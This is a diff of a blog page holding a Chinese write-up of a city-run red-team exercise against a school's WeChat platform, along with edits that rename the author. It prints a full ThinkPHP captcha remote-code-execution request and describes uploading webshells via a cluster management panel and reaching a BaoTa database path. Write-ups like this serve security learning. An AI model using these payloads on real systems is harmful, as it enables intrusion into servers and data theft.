@@ -101,7 +101,7 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="某市HW攻防演练部分总结">
 <meta property="og:url" content="http://1234xxh.github.io/2020/09/08/1/index.html">
-<meta property="og:site_name" content="ThreeP&#39;s Blog">
+<meta property="og:site_name" content="Caps&#39;s Blog">
 <meta property="og:description" content="今年护网犹如生娃，十月怀胎，奶粉备好，突然晚产；去了医院，月嫂都请好了，又不生了需要推迟">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http://1234xxh.github.io/image/N2LL/14.jpg">
@@ -114,7 +114,7 @@
 <meta property="og:image" content="http://1234xxh.github.io/image/20200908/image7.png">
 <meta property="og:image" content="http://1234xxh.github.io/image/20200908/image8.png">
 <meta property="og:image" content="http://1234xxh.github.io/image/20200908/image9.png">
-<meta property="og:updated_time" content="2020-09-08T07:54:53.462Z">
+<meta property="og:updated_time" content="2020-09-26T08:56:57.987Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="某市HW攻防演练部分总结">
 <meta name="twitter:description" content="今年护网犹如生娃，十月怀胎，奶粉备好，突然晚产；去了医院，月嫂都请好了，又不生了需要推迟">
@@ -154,7 +154,7 @@
 
 
 
-  <title>某市HW攻防演练部分总结 | ThreeP's Blog</title>
+  <title>某市HW攻防演练部分总结 | Caps's Blog</title>
   
 
 
@@ -186,12 +186,12 @@
     <div class="custom-logo-site-title">
       <a href="/"  class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
-        <span class="site-title">ThreeP's Blog</span>
+        <span class="site-title">Caps's Blog</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
       
-        <p class="site-subtitle">Web安全 | 二进制安全 | 机器学习</p>
+        <p class="site-subtitle">safe | smart contract | binary</p>
       
   </div>
 
@@ -320,13 +320,13 @@
     <link itemprop="mainEntityOfPage" href="http://1234xxh.github.io/2020/09/08/1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="ThreeP">
+      <meta itemprop="name" content="bey0ndm3">
       <meta itemprop="description" content="">
       <meta itemprop="image" content="/images/background.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="ThreeP's Blog">
+      <meta itemprop="name" content="Caps's Blog">
     </span>
 
     
@@ -403,14 +403,14 @@
         <p>今年护网犹如生娃，十月怀胎，奶粉备好，突然晚产；去了医院，月嫂都请好了，又不生了需要推迟</p>
 <p><img src="/image/N2LL/14.jpg" alt="image"><br><a id="more"></a></p>
 <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><blockquote>
-<p>HW突然临时取消，听到原因差点没被吓到，真的扯，然后拉去参加了某市组织的网络安全攻防演练，应该是自查吧。<br>拿到目标，大佬们都开动了，掏出自己神器就开始干。<br>我看到学校就疯狂，瞄准了某市某学校这个目标，开始简单的信息收集，子域名，端口，c端…..。很幸运，我脑子居然想到了我要做多线程，在等待收集结果的时候，开始对其公众号进行试探性地测试（事后想起来，我还真的佩服我自己），话不多说，展开今天的主题。</p>
+<p>HW突然临时取消，听到原因差点没被吓到，真的扯，然后被拉去参加了某市组织的网络安全攻防演练，应该是自查吧。<br>拿到目标，大佬们都开动了，掏出自己神器就开始干。<br>由于太菜，挑软柿子捏，瞄准了某市某学校这个目标，开始简单的信息收集，子域名，端口，c端…..，其实想找后台的，根据经验来说，弱口令太多了。可惜没有发现，在等待收集结果的时候，开始对其公众号进行试探性地测试。</p>
 </blockquote>
 <h1 id="0x02-总攻"><a href="#0x02-总攻" class="headerlink" title="0x02 总攻"></a>0x02 总攻</h1><blockquote>
 <p><strong>目标：某市某学校<br>突破口：公众号”某市某互动平台”-&gt;日常管理</strong></p>
 </blockquote>
 <p><img src="/image/20200908/image1.png" alt="image"></p>
 <blockquote>
-<p>在bp中，发现这个居然是tp框架，最终理想结果当然是rce，访问index.php?s=captcha，返回验证码，直接上payload：</p>
+<p>发现这个居然是tp框架，最终理想结果当然是rce，访问index.php?s=captcha，返回验证码，直接上payload：</p>
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /****/index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: *****</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; MuMu Build/V417IR; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Mobile Safari/537.36 MMWEBID/4428 MicroMessenger/7.0.17.1720(0x27001134) Process/tools WeChat/arm32 NetType/WIFI Language/zh_CN ABI/arm32</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">content-type: application/x-www-form-urlencoded;charset=utf-8</span><br><span class="line">Accept-Language: zh-CN,en-US;q=0.8</span><br><span class="line">Cookie: PHPSESSID=3i48ekanekc6jlj6i9pstl9r36</span><br><span class="line">X-Requested-With: com.tencent.mm</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 59</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=GET&amp;get[]=whoami</span><br></pre></td></tr></table></figure>
 <blockquote>
@@ -440,15 +440,15 @@
 </blockquote>
 <p><img src="/image/20200908/image6.png" alt="image"><br><img src="/image/20200908/image7.png" alt="image"></p>
 <blockquote>
-<p>巧的是找到了一个宝塔，网站集群管理系统，分别上传shell，直接全网沦陷。</p>
+<p>巧的是找到了网站集群管理系统，可对管理的站点上传shell。</p>
 </blockquote>
 <p><img src="/image/20200908/image8.png" alt="image"></p>
 <blockquote>
-<p>这都是拿分点啊，只不过感觉这分都是找出来的（毫无技术含量，侧面透露出我真菜），另外利用宝塔的0day，通过IP:888/pma可以直接登录数据库</p>
+<p>这都是拿分点啊，只不过感觉这分都是找出来的（毫无技术含量，我真菜），另外这是宝塔，通过IP:888/pma可以直接登录数据库</p>
 </blockquote>
 <p><img src="/image/20200908/image9.png" alt="image"></p>
 <h1 id="0x03-收尾"><a href="#0x03-收尾" class="headerlink" title="0x03 收尾"></a>0x03 收尾</h1><blockquote>
-<p>这个目标我们拿了8k分（另外2k分被其他队伍抢走了），挺棒的呢，感觉回去领导会给加鸡腿。<br>由于举办方只让搞到这个地步，这个目标只能结束了，再深入的也没机会了（其实可以打到办公网的，至少大屏幕和摄像头已经下来了）。<br>通过这次演练，让我明白以后无论工作还是众测，可以换个切入点，这样或许有不一样的惊喜。另外队友们很牛逼，带我飞了起来，虽然成绩不是第一，但是收获很大，学习了很多姿势，感谢大佬们。</p>
+<p>很菜，水了一篇文章，举办方禁止继续往下深入。<br>通过这次演练，让我明白了，只要队友牛逼，躺着也能起飞，收获巨大，学习了很多，感谢大佬们。</p>
 </blockquote>
 
       
@@ -476,7 +476,7 @@
         <ul class="post-copyright">
   <li class="post-copyright-author">
     <strong>Post author:</strong>
-    ThreeP
+    bey0ndm3
   </li>
     <li class="post-copyright-author">
     <strong>Post title:</strong>
@@ -550,10 +550,6 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2020/09/10/1/" rel="prev" title="自我沉淀总结">
-                自我沉淀总结 <i class="fa fa-chevron-right"></i>
-              </a>
-            
           </div>
         </div>
       
@@ -625,9 +621,9 @@
             
               <img class="site-author-image" itemprop="image"
                 src="/images/background.jpg"
-                alt="ThreeP" />
+                alt="bey0ndm3" />
             
-              <p class="site-author-name" itemprop="name">ThreeP</p>
+              <p class="site-author-name" itemprop="name">bey0ndm3</p>
               <p class="site-description motion-element" itemprop="description">我的征途是星辰大海</p>
           </div>
 
@@ -638,7 +634,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-count">13</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -661,34 +657,6 @@
 
           
 
-          
-            <div class="links-of-author motion-element">
-                
-                  <span class="links-of-author-item">
-                    <a href="https://github.com/1234xxh/" target="_blank" title="GitHub">
-                      
-                        <i class="fa fa-fw fa-github"></i>GitHub</a>
-                  </span>
-                
-                  <span class="links-of-author-item">
-                    <a href="mailto:kenvinxxh@gmail.com" target="_blank" title="E-Mail">
-                      
-                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
-                  </span>
-                
-                  <span class="links-of-author-item">
-                    <a href="https://blog.csdn.net/weixin_41185953" target="_blank" title="CSDN">
-                      
-                        <i class="fa fa-fw fa-copyright"></i>CSDN</a>
-                  </span>
-                
-                  <span class="links-of-author-item">
-                    <a href="https://weibo.com/u/6473691931" target="_blank" title="Weibo">
-                      
-                        <i class="fa fa-fw fa-weibo"></i>Weibo</a>
-                  </span>
-                
-            </div>
           
 
           
@@ -736,7 +704,7 @@
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">ThreeP</span>
+  <span class="author" itemprop="copyrightHolder">bey0ndm3</span>
 
   
 </div>
